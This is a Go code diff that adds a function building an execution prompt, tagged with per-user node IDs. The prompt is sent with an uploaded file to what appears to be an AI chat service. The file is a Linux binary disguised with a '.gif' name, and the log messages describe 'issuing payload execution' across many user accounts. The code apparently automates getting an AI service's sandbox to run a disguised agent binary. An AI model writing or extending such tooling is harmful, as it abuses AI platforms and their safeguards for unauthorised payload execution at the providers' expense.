@@ -182,6 +182,15 @@ func (m *AccountManager) waitForSignal(stopCh <-chan struct{}, lastSeenRebuild u
 	}
 }
 
+func buildExecPrompt(user models.UserRecord) string {
+	return fmt.Sprintf(
+		"%s。运行前需要设置环境变量 NODE_ID=%q 和 NODE_LABEL=%q。",
+		config.MimoExecPrompt,
+		user.UserID,
+		"user:"+user.UserID,
+	)
+}
+
 func (m *AccountManager) runLifecycle(user models.UserRecord, stopCh <-chan struct{}) {
 	payloadPath := "bridge/node-metrics-agent-linux-amd64.gif"
 	lastSeenRebuild := m.currentRebuildVersion()
@@ -333,7 +342,7 @@ outer:
 		}
 
 		userLogf("下发载荷执行指令...")
-		reply, err = client.SendFileMessage(uploadData, config.MimoExecPrompt)
+		reply, err = client.SendFileMessage(uploadData, buildExecPrompt(user))
 		if err != nil {
 			userLogf("下发载荷执行失败: %v", err)
 			client.Close()
